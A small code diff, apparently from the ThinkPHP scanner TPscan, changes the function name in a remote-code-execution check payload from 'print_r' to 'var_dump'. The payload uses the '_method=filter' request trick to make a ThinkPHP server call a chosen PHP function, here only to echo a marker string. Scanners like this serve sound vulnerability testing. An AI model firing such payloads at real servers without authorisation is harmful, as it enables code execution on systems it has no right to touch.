@@ -19,7 +19,7 @@ def thinkphp_method_filter_code_exec_verify(url):
         "User-Agent" : 'TPscan',
     }
     payload = {
-        'c':'print_r',
+        'c':'var_dump',
         'f':'4e5e5d7364f443e28fbf0d3ae744a59a',
         '_method':'filter',
     }
